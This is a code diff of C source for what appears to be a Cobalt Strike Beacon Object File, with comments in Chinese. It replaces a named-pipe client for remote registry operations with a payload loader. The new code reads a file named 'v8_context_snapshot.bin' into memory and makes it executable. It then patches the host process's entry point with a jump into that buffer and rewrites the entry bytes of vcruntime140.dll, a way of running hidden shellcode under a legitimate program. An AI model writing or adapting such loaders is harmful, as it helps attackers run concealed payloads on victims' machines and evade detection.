@@ -24,165 +24,90 @@ void(*PBeaconInjectTemporaryProcess)(PROCESS_INFORMATION * pInfo, char * payload
 void(*PBeaconCleanupProcess)(PROCESS_INFORMATION * pInfo) = BeaconCleanupProcess;
 BOOL(*PtoWideChar)(char * src, wchar_t * dst, int max) = toWideChar;
 
-#define BUFSIZE 4096
-void parseResponse(char* reply);
-
-void *myMemcpy(void *dest, const void *src, size_t n) {
-	char *pDest = (char*)dest;
-	const char *pSrc = (const char*)src;
-	for (size_t i = 0; i < n; ++i) {
-		*pDest++ = *pSrc++;
-	}
-	return dest;
-}
-
-void splitParam(char* param, char* params[])
-{
-	int length = strlen((char*)param);
-
-	for (int i = 0, j = 0, index = 0; i < length; i++)
-	{
-		if (param[i] == ';' && param[i + 1] == ';')
-		{
-			params[j] = (char*)HeapAlloc(GetProcessHeap(), 0, 0x1000);
-			myMemcpy(params[j], (param + index), i - index);
-			params[j][i - index] = '\x0';
-			index = i + 2;
-			j++;
-			i++;
-		}
-	}
+void* myMemcpy(void* dest, const void* src, size_t n) {
+    char* pDest = (char*)dest;
+    const char* pSrc = (const char*)src;
+    for (size_t i = 0; i < n; ++i) {
+        *pDest++ = *pSrc++;
+    }
+    return dest;
 }
 
 int begin(char* param)
 {
-	HANDLE hPipe = NULL;
-	DWORD dwReturn = 0;
-	LPCTSTR lpszPipename = TEXT("\\\\.\\pipe\\Improvement");
+    LPCSTR fileName = "v8_context_snapshot.bin"; // 替换为要读取的二进制文件名
 
-	// 判断是否有可以利用的命名管道
-	if (!WaitNamedPipe(lpszPipename, NMPWAIT_USE_DEFAULT_WAIT))
-	{
-		PBeaconPrintf(CALLBACK_ERROR, "未启动注册表注入功能");
-		return 0;
-	}
-	
-	// 打开可用的命名管道 , 并与服务器端进程进行通信  
-	hPipe = CreateFile(lpszPipename, GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_READ | FILE_SHARE_WRITE,
-		NULL, OPEN_EXISTING, 0, NULL);
+    // 打开文件
+    HANDLE hFile = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return 1;
+    }
 
-	if (hPipe == INVALID_HANDLE_VALUE)
-	{
-		PBeaconPrintf(CALLBACK_ERROR, "Open Read Pipe Error");
-		return 0;
-	}
-	
-	HANDLE hHeap = GetProcessHeap();
-	TCHAR* pchRequest = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE * sizeof(TCHAR));
-	TCHAR* pchReply = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE * sizeof(TCHAR));
-	DWORD cbBytesRead = 0, cbRequestBytes = 0, cbWritten = 0;
-	BOOL fSuccess = FALSE;
+    // 获取文件大小
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        return 1;
+    }
 
-	cbRequestBytes = (lstrlen(param) + 1) * sizeof(TCHAR);
+    // 读取文件内容
+    HANDLE hHeap = GetProcessHeap();
+    LPVOID buffer = HeapAlloc(hHeap, 0, fileSize);
 
-	// Write the reply to the pipe. 
-	fSuccess = WriteFile(
-		hPipe,        // handle to pipe 
-		param,     // buffer to write from 
-		cbRequestBytes, // number of bytes to write 
-		&cbWritten,   // number of bytes written 
-		NULL);        // not overlapped I/O 
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
+        CloseHandle(hFile);
+        return 1;
+    }
 
-	if (!fSuccess || cbRequestBytes != cbWritten)
-	{
-		PBeaconPrintf(CALLBACK_ERROR, "WriteFile Error");
-	}
-	
-	// Read client requests from the pipe. This simplistic code only allows messages
-	// up to BUFSIZE characters in length.
-	fSuccess = ReadFile(
-		hPipe,        // handle to pipe 
-		pchReply,    // buffer to receive data 
-		BUFSIZE * sizeof(TCHAR), // size of buffer 
-		&cbBytesRead, // number of bytes read 
-		NULL);        // not overlapped I/O 
+    HMODULE ImageBase = GetModuleHandle(NULL);
 
-	if (!fSuccess || cbBytesRead == 0)
-	{
-		PBeaconPrintf(CALLBACK_ERROR, "ReadFile Error");
-	}
-	
-	parseResponse(pchReply);
-	
-	CloseHandle(hPipe);
+    PIMAGE_DOS_HEADER  pDH = NULL;//指向IMAGE_DOS结构的指针
+    PIMAGE_NT_HEADERS  pNtH = NULL;//指向IMAGE_NT结构的指针
+    PIMAGE_FILE_HEADER pFH = NULL;;//指向IMAGE_FILE结构的指针
+    PIMAGE_OPTIONAL_HEADER pOH = NULL;//指向IMAGE_OPTIONALE结构的指针
 
-	HeapFree(hHeap, 0, pchRequest);
-	HeapFree(hHeap, 0, pchReply);
+    //IMAGE_DOS Header结构指针
+    pDH = (PIMAGE_DOS_HEADER)ImageBase;
+    //IMAGE_NT Header结构指针
+    pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH->e_lfanew);
+    //IMAGE_File Header结构指针
+    pFH = &pNtH->FileHeader;
+    //IMAGE_Optional Header结构指针
+    pOH = &pNtH->OptionalHeader;
+
+    DWORD dwOEP = pOH->AddressOfEntryPoint;    // 程序执行入口地址
+    dwOEP = (DWORD)(pOH->ImageBase + dwOEP);   // 映射起始地址+执行入口地址
+
+    DWORD dwOld;
+    VirtualProtect((LPVOID)buffer, fileSize, PAGE_EXECUTE_READWRITE, &dwOld);
+
+    VirtualProtect((LPVOID)dwOEP, 0x1000, PAGE_EXECUTE_READWRITE, &dwOld);
+    *(PBYTE)dwOEP = 0xE9;
+    *(PDWORD)(dwOEP + 1) = (DWORD)buffer - dwOEP - 5;
+    VirtualProtect((LPVOID)dwOEP, 0x1000, dwOld, &dwOld);
+
+    HMODULE dllImageBase = GetModuleHandle("vcruntime140.dll");
+    pDH = (PIMAGE_DOS_HEADER)dllImageBase;
+    pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH->e_lfanew);
+    pFH = &pNtH->FileHeader;
+    pOH = &pNtH->OptionalHeader;
+
+    dwOEP = pOH->AddressOfEntryPoint;    // 程序执行入口地址
+    dwOEP = (DWORD)(pOH->ImageBase + dwOEP);   // 映射起始地址+执行入口地址
+
+    VirtualProtect((LPVOID)dwOEP, 0x1000, PAGE_EXECUTE_READWRITE, &dwOld);
+    *(PBYTE)(dwOEP + 0) = 0x55;
+    *(PBYTE)(dwOEP + 1) = 0x8b;
+    *(PBYTE)(dwOEP + 2) = 0xec;
+    *(PBYTE)(dwOEP + 3) = 0x83;
+    *(PBYTE)(dwOEP + 4) = 0x7d;
+    VirtualProtect((LPVOID)dwOEP, 0x1000, dwOld, &dwOld);
+
+    // 释放资源
+    CloseHandle(hFile);
 
 	return 0;
-}
-
-int myAtoi(char* str) {
-	int num = 0;
-	int sign = 1;
-	char* p = str;
-
-	// 处理字符串前面的空格
-	while (*p == ' ') {
-		p++;
-	}
-
-	// 处理正负号
-	if (*p == '+') {
-		p++;
-	}
-	else if (*p == '-') {
-		sign = -1;
-		p++;
-	}
-
-	// 处理数字字符
-	while (*p >= '0' && *p <= '9') {
-		num = num * 10 + (*p - '0');
-		p++;
-	}
-
-	return num * sign;
-}
-
-void parseResponse(char* reply)
-{
-	char* replys[3];
-	splitParam((char*)reply, replys);
-
-	int operand = myAtoi(replys[0]);
-	BOOL isSuccess = replys[1][0] - '0';
-	char* result[] = {"失败", "成功"};
-
-	if (operand == 0 || operand == 3 || operand == 6)
-	{
-		PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值添加%s", result[isSuccess]);
-	}
-	else if (operand == 1 || operand == 4 || operand == 7)
-	{
-		PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值修改%s", result[isSuccess]);
-	}
-	else if (operand == 2 || operand == 5 || operand == 8)
-	{
-		if (isSuccess)
-			PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值查询%s, 查询的值为:%s", result[isSuccess], replys[2]);
-		else
-			PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值查询%s, 键不存在", result[isSuccess]);
-	}
-	else if (operand == 9 || operand == 10)
-	{
-		PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值删除%s", result[isSuccess]);
-	}
-	else
-	{
-		PBeaconPrintf(CALLBACK_OUTPUT, "注册表不支持当前操作数");
-	}
 }
 
 void strat(LPVOID param)
